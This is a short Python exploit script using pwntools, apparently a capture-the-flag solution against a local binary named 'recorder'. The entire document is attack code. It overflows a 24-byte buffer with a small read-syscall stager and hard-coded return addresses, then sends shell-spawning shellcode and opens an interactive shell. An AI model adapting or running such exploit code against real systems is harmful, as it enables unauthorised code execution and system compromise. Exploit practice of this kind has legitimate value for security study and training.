from pwn import *
context.arch = 'amd64'

p = process('./recorder')

p.sendafter('name?','aa')
payload = asm(
    '''
    pop rsi
    xor rdi, rdi
    pop rdx
    syscall
    '''
)
payload += b'a'*(24-len(payload)) + p64(0x601060) + p64(0x601067)
p.sendafter('record?', payload)
p.send(asm(shellcraft.sh()))

p.interactive()